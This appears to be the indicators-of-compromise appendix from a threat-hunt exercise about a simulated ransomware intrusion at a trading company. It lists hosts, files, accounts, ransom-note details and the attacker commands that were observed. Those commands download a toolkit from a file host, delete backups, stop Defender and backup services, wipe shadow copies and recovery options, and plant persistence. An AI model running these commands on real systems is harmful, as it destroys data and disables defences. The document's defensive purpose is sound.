# AZUKI BREACH Threat Hunt - Part 4: Indicators of Compromise (IOCs)

This document contains all Indicators of Compromise identified during the Part 4 threat hunt investigation of the JADE SPIDER intrusion at Azuki Import/Export Trading Co.

---

## Network Indicators

### External IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 108.181.20.36 | Malware hosting | litter.catbox.moe |

### Internal IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 10.1.0.204 | azuki-sl | Beachhead, ransomware target |
| 10.1.0.108 | azuki-adminpc | Ransomware deployment source |
| 10.1.0.188 | azuki-fileserver01 | Ransomware target |
| 10.1.0.189 | azuki-backupsrv | Backup server (destroyed) |
| 10.1.0.102 | azuki-logistics | Ransomware target |

### Domains

| Domain | Description |
|--------|-------------|
| litter.catbox.moe | Malware hosting (destroy.7z) |

### URLs

| URL | Description |
|-----|-------------|
| https://litter.catbox.moe/io523y.7z | Backup destruction toolkit (destroy.7z) |

### Tor Infrastructure (from Ransom Note)

| URL | Description |
|-----|-------------|
| http://lynxch2k5xi7y3f4zdqhkl3jh2vbpxwfqmneqtjsv44xm7d.onion | Negotiation portal |
| http://lynxbkup7vqz3m8nkpqwjl2xc4hd6fy9stbe2wk7.onion | Mirror 1 |
| http://lynxgate8rjd4kl2mwqz9nc5xbhfy7tv3de6uj8.onion | Mirror 2 |
| http://lynxleakwb7q2ktlmne8.onion | Data leak site |

---

## Host-Based Indicators

### Compromised Systems

| Device Name | IP Address | Role | Status |
|-------------|------------|------|--------|
| azuki-sl | 10.1.0.204 | Workstation | Encrypted |
| azuki-adminpc | 10.1.0.108 | Admin PC | Encrypted |
| azuki-fileserver01 | 10.1.0.188 | File Server | Encrypted |
| azuki-backupsrv | 10.1.0.189 | Backup Server | Backups Destroyed |
| azuki-logistics | 10.1.0.102 | Logistics PC | Encrypted |

### Malicious Files

| Filename | Path | Description |
|----------|------|-------------|
| silentlynx.exe | C:\Windows\Temp\cache\ | JADE SPIDER ransomware |
| silentlynx.exe | C:\Windows\Temp\ | JADE SPIDER ransomware (azuki-sl) |
| destroy.7z | /home/backup-admin/ | Backup destruction toolkit |
| meterpreter.exe | C:\Windows\Temp\cache\ | Metasploit C2 beacon |
| PsExec64.exe | C:\Windows\Temp\cache\ | Remote execution tool |
| SILENTLYNX_README.txt | Desktop, Documents | Ransom note |

### File Extensions

| Extension | Description |
|-----------|-------------|
| .lynx | Encrypted file extension |

### Directories Destroyed (Linux Backup Server)

| Path | Contents |
|------|----------|
| /backups/archives | Archived backups |
| /backups/azuki-adminpc | CEO PC backups |
| /backups/azuki-fileserver | File server backups |
| /backups/azuki-logisticspc | Logistics PC backups |
| /backups/config-backups | Configuration backups |
| /backups/configs | System configurations |
| /backups/daily | Daily backup rotation |
| /backups/database-backups | Database dumps |
| /backups/databases | Database files |
| /backups/fileserver | File server data |
| /backups/logs | Log archives |
| /backups/monthly | Monthly backup rotation |
| /backups/weekly | Weekly backup rotation |
| /backups/workstations | Workstation backups |

### Sensitive Files Accessed

| Filename | Path | Description |
|----------|------|-------------|
| all-credentials.txt | /backups/configs/ | Plaintext credentials |
| network-config.txt | /backups/config-backups/ | Network configuration |

### User Accounts

| Account | Type | Description |
|---------|------|-------------|
| backup-admin | Compromised | Linux backup server access |
| kenji.sato | Compromised | PsExec deployment |
| fileadmin | Compromised | PsExec deployment |
| yuki.tanaka | Compromised | Attack orchestration |

### Registry Keys (Persistence)

| Key | Value Name | Value Data |
|-----|------------|------------|
| HKEY_CURRENT_USER\S-1-5-21-1893365723-3474686573-4097541393-500\Software\Microsoft\Windows\CurrentVersion\Run | SystemHealthMonitor | C:\Windows\Temp\cache\meterpreter.exe |
| HKEY_CURRENT_USER\S-1-5-21-1893365723-3474686573-4097541393-500\Software\Microsoft\Windows\CurrentVersion\Run | WindowsSecurityHealth | C:\Windows\Temp\cache\silentlynx.exe |

### Scheduled Tasks (Persistence)

| Task Path | Executable | Trigger |
|-----------|------------|---------|
| Microsoft\Windows\Security\SecurityHealthService | C:\Windows\Temp\cache\silentlynx.exe | OnLogon |

---

## Behavioral Indicators

### Linux Backup Server Commands

**SSH Access:**
```bash
"ssh.exe" backup-admin@10.1.0.189
```

**Discovery Commands:**
```bash
ls --color=auto -la /backups/
find /backups -name *.tar.gz
find / -name *backup* -type d
cat /etc/passwd
cat /etc/crontab
```

**Credential Access:**
```bash
cat /backups/configs/all-credentials.txt
cat /backups/config-backups/network-config.txt
```

**Tool Download:**
```bash
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
```

**Backup Destruction:**
```bash
rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations
```

**Service Disruption:**
```bash
systemctl stop cron
systemctl disable cron
```

### Windows Ransomware Deployment

**PsExec Deployment:**
```cmd
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
"PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
"PsExec64.exe" \\10.1.0.204 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
```

### Windows Recovery Inhibition

**Service Stop Commands:**
```cmd
"net" stop VSS /y
"net" stop wbengine /y
"net" stop SDRSVC /y
"net" stop WinDefend /y
"net" stop wscsvc /y
"net" stop WdNisSvc /y
```

**Process Termination:**
```cmd
"taskkill" /F /IM sqlservr.exe
"taskkill" /F /IM mysql.exe
"taskkill" /F /IM oracle.exe
"taskkill" /F /IM postgres.exe
"taskkill" /F /IM mongodb.exe
"taskkill" /F /IM outlook.exe
"taskkill" /F /IM excel.exe
"taskkill" /F /IM winword.exe
"taskkill.exe" /F /IM MsMpEng.exe
"taskkill.exe" /F /IM MpCmdRun.exe
"taskkill.exe" /F /IM NisSrv.exe
```

**Shadow Copy Deletion:**
```cmd
"vssadmin.exe" delete shadows /all /quiet
"vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB
"wmic" shadowcopy delete /nointeractive
```

**Backup Catalog Deletion:**
```cmd
"wbadmin" delete catalog -quiet
```

**Recovery Disabled:**
```cmd
"bcdedit" /set {default} recoveryenabled No
```

**Anti-Forensics:**
```cmd
"fsutil.exe" usn deletejournal /D C:
```

### Persistence Commands

**Registry Run Key:**
```cmd
reg add "HKEY_CURRENT_USER\S-1-5-21-1893365723-3474686573-4097541393-500\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSecurityHealth /d "C:\Windows\Temp\cache\silentlynx.exe"
```

**Scheduled Task:**
```cmd
"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f
```

---

## Ransom Note Indicators

### Threat Actor Information

| Field | Value |
|-------|-------|
| Group Name | SilentLynx Security Team |
| Affiliate ID | SL-AFF-2847 |
| Affiliate Network | SilentLynx |
| Encryption Version | v3.2.1-LNX |

### Victim Identifiers

| Field | Value |
|-------|-------|
| Victim Key | AZUKI-BC844-1127 |
| Access Token | 7f3a9c2b4e8d1f6a9b2c3d7e |
| Decryption PIN | xK9$mL2#pQ7@wN4&vB8! |
| Payment ID | bc844f3a9c2b4e8d1f6a |
| Encryption ID | 7f3a9c2b-4e8d-1f6a-9b2c-3d7e8f4a1c5b |

### Encryption Details

| Field | Value |
|-------|-------|
| Algorithm | AES-256-GCM |
| Key Exchange | X25519 ECDH |
| Key Wrapping | RSA-4096 |
| File Extension | .lynx |
| Files Encrypted | 847,293 |
| Data Encrypted | 847.2 GB |

### Ransom Demand

| Field | Value |
|-------|-------|
| Amount | $850,000 USD |
| Currency | Monero (XMR) only |
| Deadline | 72 hours |
| Escalation | Price doubles at 72h, data published at 144h |

### Contact Methods

| Method | Value |
|--------|-------|
| Session Messenger | 05a8f3c2b7d9e4f1a6c8b3d7e2f9a4c1b6d8e3f7a2c5b9d4e8f1a3c6b9d2e5f8a1c4b7 |
| Email | silentlynx@dnmx.org |
| Email (Backup) | silentlynx_support@onionmail.org |

---

## IOC Comparison Across All Parts

### Malware Hosting Infrastructure

| Part | Service | URL |
|------|---------|-----|
| Part 1 | Discord | Discord webhooks |
| Part 2 | file.io | file.io |
| Part 3 | litter.catbox.moe | https://litter.catbox.moe/gfdb9v.7z |
| Part 4 | litter.catbox.moe | https://litter.catbox.moe/io523y.7z |

### Exfiltration Infrastructure

| Part | Service | Destination |
|------|---------|-------------|
| Part 1 | Discord | Discord webhooks |
| Part 2 | file.io | file.io |
| Part 3 | gofile.io | store1.gofile.io (45.112.123.227) |
| Part 4 | N/A | Ransomware deployment phase |

### Compromised Accounts

| Part | Account | Target System |
|------|---------|---------------|
| Part 1 | kenji.sato | azuki-sl |
| Part 1 | support (backdoor) | azuki-sl |
| Part 2 | fileadmin | azuki-fileserver01 |
| Part 3 | yuki.tanaka | azuki-adminpc |
| Part 3 | yuki.tanaka2 (backdoor) | azuki-adminpc |
| Part 4 | backup-admin | azuki-backupsrv |

### Malicious Files

| Part | Filename | Purpose |
|------|----------|---------|
| Part 1 | mm.exe | Credential dumping |
| Part 2 | pd.exe | Credential dumping |
| Part 3 | m.exe | Mimikatz |
| Part 3 | meterpreter.exe | C2 beacon |
| Part 3 | silentlynx.exe | Custom implant |
| Part 4 | destroy.7z | Backup destruction toolkit |
| Part 4 | silentlynx.exe | Ransomware |
| Part 4 | PsExec64.exe | Remote execution |

### Staging Directories

| Part | System | Directory |
|------|--------|-----------|
| Part 1 | azuki-sl | C:\ProgramData\WindowsCache |
| Part 2 | azuki-fileserver01 | C:\Windows\Logs\CBS |
| Part 3 | azuki-adminpc | C:\Windows\Temp\cache\ |
| Part 4 | azuki-adminpc | C:\Windows\Temp\cache\ |

---

## References

- [JADE SPIDER Threat Intel Report](https://www.notion.so/JADE-SPIDER-2b0cf57416ff80f38f39f75f670b09e2)
- [Part 1 IOCs](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-1-port-of-entry/docs/indicators-of-compromise.md)
- [Part 2 IOCs](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-2-cargo-hold/docs/indicators-of-compromise.md)
- [Part 3 IOCs](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/indicators-of-compromise.md)
